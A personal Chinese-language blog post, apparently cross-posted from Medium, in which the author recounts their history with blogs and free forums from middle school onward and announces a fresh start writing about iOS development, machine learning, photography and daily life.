這個簡單的標題當作開端回想起寫Blog的歷史，大約是在國中正值最瘋遊戲的時期，那時候家中電腦很爛基本沒什麼遊戲可以玩，但在那個貪玩的年紀，就算沒遊戲可以打還是要每天打開電腦，對那時候的我來說就已經很新鮮了．由於以上因素，所以大部分用電腦的時間我都在用即時通跟同學喇賽、逛逛網頁；可想而知，其實很空洞又缺乏成就感(至少別人玩遊戲還能獲得成就感)而就在那時”Blog”正值興盛時期這個對我來說非常的新鮮；而第一個接觸的當然就是紅極一時的無名小站，當我辦好帳號第一次打開Blog的那個時刻心情就是「哇！有自己的網站」、「哇！還可以換樣式好酷」；剛好學校電腦課有教網頁設計(Front-Page 2003/ 阿聖網站 )，所以第一個Blog都在研究功能上的項目；找素材、玩樣式跟裝很多很“夏趴”的JavaScript外掛，反觀內容質量部分基本上都是廢文．這讓當時對網路世界懵懂無知的我有了更深入的認識，例如：如何找資料?、外掛裝上去壞掉怎麼解決?、圖片怎麼嵌入?….等等其中有許多資料都是由論壇取得，當時也是”論壇”的興盛時期，但我就是標準的潛水客只看不發，偶爾回個文「感謝大大無私分享」；在逛各大論壇的時候發現有”免費論壇”這種東西，申請就能當站長有自己的論壇，Level相比Blog又更高一層了，這次是“站長”、“站長”、“站長” 好酷！！結合之前玩轉Blog設定的基礎，論壇可以玩的設定又多更多(開版/會員權限/插件中心) 什麼都可以自己設定，宛如進入到另一個世界免費論壇系統有很多家；當中一直換來換去不斷的嘗試，有的是功能不完全、有的是不自由、有的不穩定、有的廣告太干擾，最後比較有印象的是 Marlito ，最符合我的需求，也在上面經營得最久．與此同時，Blog也搬家到” 優仕網部落格 ”；起因是無名開始限制東限制西，優仕網那時候剛起步，先來先贏、限制少、功能符合需求，這次有在經營文章內容，7成在分享我覺得好用的程式(類似阿榮福利味)另外3成是玩論壇的經驗分享(設定/BUG處理)文章總數大約30篇，瀏覽量一天約200人/最高500人(現在看來沒什麼)、優仕網部落格排行榜前10名，流量幾乎都來在分享好用程式的文章；認真經營了一年多，再來遇到國三忙課業、上高中，一路斷斷續續，之後又參加選手培訓就放著養蚊子了。由於Blog名稱太中二，只放上瀏覽數截圖之後又再創了一個 Blogger 都是技術面的文章紀錄寫程式遇到的問題跟解決方法；但Blogger不好用，基本功能都無法滿足，寫了幾篇就放棄了後期自己申請網域跟買空間架了一個WordPress Blog，但什麼都要自己來、設定、調整功能…我無法專注在寫內容這件事上ㄧ樣是斷斷續續在寫，空間到期後就不續約網站直接下線直到現在。總結，一路走來從對Blog這個東西感到很新鮮-&gt;到-&gt;研究玩轉Blog的功能-&gt;到-&gt;開始專注Blog本質-文章內容-&gt;到-&gt;分享技術型文章懶了、少了紀錄過程及回頭檢視和分享出來、嘗過廣告收益的甜頭，漸漸地離初衷越來越遠，單純熱心想要與大家分享的那顆心https://www.flickr.com/photos/zuvonne/3738631215給自己一個新目標，教學相長為初衷，開始重新紀錄生活！ 技術面的：iOS App開發,Swift,PHP,Mysql… 生活面的：工作、攝影、開箱、Murmur有的沒的 經驗面的：最近在碰機器學習，從0開始的過程 故事面的：技能競賽經歷、生活觀察 本文同步發表於個人 Blog： [點我前往] 。 有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 258 Total Views Last Statistics Date: 2025-01-19 | 223 Views on Medium. " } ]
